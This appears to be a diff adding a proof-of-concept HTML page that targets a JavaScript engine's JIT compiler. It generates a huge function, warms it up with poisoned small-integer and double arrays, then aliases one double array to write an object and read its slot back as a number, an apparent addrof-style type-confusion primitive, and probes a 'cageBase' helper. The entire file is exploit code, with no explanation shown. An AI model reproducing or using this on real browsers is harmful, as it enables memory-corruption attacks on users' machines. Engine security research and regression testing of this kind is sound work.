@@ -1,0 +1,40 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const N_BLOCKS = 650;
+const LOOP_OPS = 430;
+const lines = ["function trigger(x, arr, alias, obj, idx, limit) {"];
+for (let i = 0; i < N_BLOCKS; i++) lines.push(`  if (x === ${i}) return ${i};`);
+lines.push("  arr[0] = obj;");
+lines.push("  let i = 0;");
+lines.push("  let res = 0;");
+lines.push("  while (i < limit) {");
+for (let i = 0; i < LOOP_OPS; i++) lines.push(`    res = (res + i) | 0;`);
+lines.push("    res = alias[idx] + 0.0;");
+lines.push("    i++;");
+lines.push("  }");
+lines.push("  return res;");
+lines.push("}");
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+
+const obj = {marker: 0x1337};
+function makeSmi(poison) { const a = [1, 2, 3]; if (poison) a.sinkhole = 1; return a; }
+function makeDouble(poison) { const a = [1.1, 2.2, 3.3]; if (poison) a.sinkhole = 1; return a; }
+makeSmi(true);
+makeDouble(true);
+for (let i = 0; i < 12000; i++) {
+  trigger(1000, makeSmi(false), makeDouble(false), obj, 0, 1);
+  trigger(1000, makeDouble(false), makeDouble(false), obj, 0, 1);
+}
+console.log("warmup complete");
+setTimeout(() => {
+  const victim = makeDouble(false);
+  try {
+    const result = trigger(1000, victim, victim, obj, 0, 1);
+    console.log("result", typeof result, result);
+    console.log("victim0", typeof victim[0], victim[0]);
+    console.log("cage", typeof cageBase === "function" ? "0x" + cageBase().toString(16) : "missing");
+  } catch (e) { console.log("caught", e && e.name, String(e)); }
+}, 2000);
+</script>
